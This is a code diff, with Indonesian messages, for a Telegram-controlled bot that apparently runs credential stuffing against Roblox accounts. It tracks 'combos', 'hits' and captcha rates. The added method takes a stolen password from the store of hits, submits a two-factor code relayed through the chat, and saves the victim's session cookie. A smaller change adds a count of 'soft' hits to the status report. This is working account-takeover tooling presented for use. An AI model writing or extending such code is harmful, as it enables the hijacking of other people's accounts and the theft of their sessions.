@@ -51,6 +51,27 @@ kalau ada WARM NEEDED, balas tokennya langsung ke chat ini"""
 
 
 class Bot:
+    def _do_2fa(self, user, code):
+        raw = store.get_state("2fa:%s" % user.lower())
+        if not raw:
+            return self.send("gak ada challenge 2FA buat %s" % user)
+        h = store.get_hit(user)
+        if not h:
+            return self.send("hit %s gak ketemu" % user)
+        import json as _j
+        import rblx
+        ch = _j.loads(raw)
+        cli = rblx.Roblox()
+        cli.challenge = {"id": ch.get("id"), "type": ch.get("type") or
+                         "twostepverification", "meta": ch.get("meta") or {},
+                         "token": None}
+        st, det, ck = cli.login_2fa(user, h["password"], code, cli.challenge)
+        if st == "hit" and ck:
+            store.update_hit_cookie(user, ck, "")
+            self.send("2FA OK: %s | cookie diupdate" % user)
+        else:
+            self.send("2FA gagal: %s %s" % (st, det))
+            
     def __init__(self, token, owner, stop, pool):
         self.token, self.owner, self.stop, self.pool = token, owner, stop, pool
         self.offset = int(store.get_state("tg_offset") or 0)
@@ -105,9 +126,9 @@ class Bot:
             self.send(HELP)
         elif c == "/status":
             st = store.stats()
-            self.send("users=%d hits=%d\ncombos=%s\nchecker=%s mode=%s\n"
+            self.send("users=%d hits=%d soft=%d\ncombos=%s\nchecker=%s mode=%s\n"
                       "captcha=%d rate=%.2f\nstats=%s" % (
-                          st["users"], st["hits"], st["combos"],
+                          st["users"], st["hits"], store.soft_count(), st["combos"],
                           "PAUSED" if self.pool.paused else "RUNNING",
                           self.pool.mode, store.captcha_count(),
                           self.pool.captcha_rate(), self.pool.stats))
